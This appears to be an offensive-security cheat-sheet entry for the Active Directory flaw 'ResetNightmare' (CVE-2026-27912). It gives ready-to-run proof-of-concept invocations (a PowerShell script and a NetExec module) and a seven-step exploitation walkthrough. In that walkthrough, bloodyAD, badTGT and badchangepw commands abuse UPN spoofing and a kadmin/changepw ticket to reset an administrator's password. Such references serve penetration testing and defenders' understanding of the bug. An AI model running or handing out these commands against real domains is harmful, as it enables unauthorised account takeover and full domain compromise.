# ResetNightmare

> CVE-2026-27912

* [Semperis-Community/ResetNightmare](https://github.com/Semperis-Community/ResetNightmare) - POC tool for ResetNightmare (CVE-2026-27912)

    ```ps1
    . .\ResetNightmare.ps1

    Invoke-ResetNightmare `
        -TargetAccount "victim" `
        -TargetNewPassword "NewP@ssw0rd!" `
        -UPNUser "controlledUser" `
        -UPNUserPassword "ControlledP@ss!"
    ```

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) - resetnightmare module

    ```ps1
    nxc ldap 10.10.10.10 -u user -p password -M resetnightmare -o TARGET='administrator' NEW_PASSWORD='P@ssw0rd' UPN_USER='nxc$' UPN_PASSWORD='Password123!'
    ```

**Exploitation**:

1. An attacker has obtained a user named **UPNUser**, with no special permissions other than the ability to modify their own UPN value.
2. The attacker sets the user's UPN to the `SamAccountName` of the targeted account; for example, **DemoAdmin1**. This action does not require bypassing UPN uniqueness verification checks. **DemoAdmin1**'s actual UPN should be **<DemoAdmin1@demo.lab>**, so setting **UPNUser**'s UPN to just **DemoAdmin1** is allowed.

    ```ps1
    bloodyAD -H 10.10.10.10 -d domain.lab -u Attacker -p 'Password123!' get object 'DemoAdmin1' --attr sAMAccountName
    bloodyAD -H 10.10.10.10 -d domain.lab -u Attacker -p 'Password123!' set object UPNUser userPrincipalName -v DemoAdmin1
    ```

3. The attacker requests a TGT for `kadmin/changepw` by specifying **DemoAdmin1** as the user name, `NT-ENTERPRISE` as the name type, and **UPNUser**'s password.

    ```ps1
    badTGT 'kerberos+pw://domain.lab\DemoAdmin1:Password123!@10.10.10.10/?ptype=10' --ccache UPNUser.ccache --sname kadmin/changepw
    ```

4. The DC returns a `TGT_REP` with a TGT for **UPNUser** (as indicated by `PAC_REQUESTOR_SID` in the PAC), but with the username **DemoAdmin1**(NT_ENTERPRISE).

5. Using this ticket to issue a password change request will reset **UPNUser**'s password. To escalate privileges, the attacker changes or clears **UPNUser**'s UPN value, leaving no user with the UPN appearing on the ticket.

    ```ps1
    bloodyAD -H 10.10.10.10 -d domain.lab -u Attacker -p 'Password123!' set object UPNUser userPrincipalName -v UPNUser
    badchangepw 'kerberos+ccache://domain.lab\DemoAdmin1:UPNUser.ccache@10.10.10.10' 'newAdminPwd1!'
    ```

6. Trying to use this ticket for a `TGS_REQ` after the UPN change will result in a `KDC_ERR_TGT_REVOKED` error, due to the `PAC_REQUESTOR_SID` patch, blocking impersonation. However, by using this ticket to construct the password change request, the password change works.

7. Now, the attacker can request a new TGT for **DemoAdmin1**, without specifying the `NT-ENTERPRISE` name type. The request now works and the name type of the ticket is `NT-PRINCIPAL`, indicating that the ticket belongs to the real (SamAccountName) **DemoAdmin1** user.

## References

* [Exploiting AD ResetNightmare (CVE-2026-27912) and KerberLoss (CVE-2026-25177) from Linux - Baptiste Crépin - August 10, 2026](https://cravaterouge.com/articles/resetnightmare/)
* [Identity Crisis: Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover - Shai Laron - August 05, 2026](https://www.semperis.com/blog/identity-crisis-novel-vulnerabilities-leading-to-kerberos-downgrade-dos-and-full-domain-takeover/)
